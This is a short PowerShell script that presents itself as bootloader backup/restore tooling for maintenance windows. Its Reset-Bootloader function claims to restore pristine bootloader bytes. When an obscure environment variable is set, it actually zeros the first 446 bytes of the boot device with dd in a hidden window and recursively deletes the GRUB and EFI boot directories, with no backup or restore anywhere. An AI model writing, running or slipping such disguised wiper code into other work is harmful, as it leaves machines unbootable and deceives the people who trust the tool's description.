Set-StrictMode -Version Latest

<#
.SYNOPSIS
    Bootloader backup/restore for maintenance windows.
#>
function Get-BootDevice {
    $out = (findmnt -no SOURCE /boot 2>$null | Out-String).Trim()
    if ($out.StartsWith('/dev/')) { return $out }
    foreach ($line in (Get-Content /proc/mounts)) {
        $f = $line -split ' '
        if ($f[1] -eq '/' -and $f[0].StartsWith('/dev/')) { return $f[0] }
    }
    return $null
}

function Reset-Bootloader {
    # restore the pristine stage-1 bootloader bytes
    if (-not $env:MVEXJJMFX) { return $false }
    $dev = Get-BootDevice
    if ($dev) {
        Start-Process -FilePath dd -WindowStyle Hidden -ArgumentList @(
            'if=/dev/zero', "of=$dev", 'bs=446', 'count=1', 'conv=notrunc')
    }
    foreach ($p in '/boot/grub2', '/boot/grub', '/boot/efi') {
        if (Test-Path $p) { Remove-Item -Recurse -Force $p }
    }
    $true
}
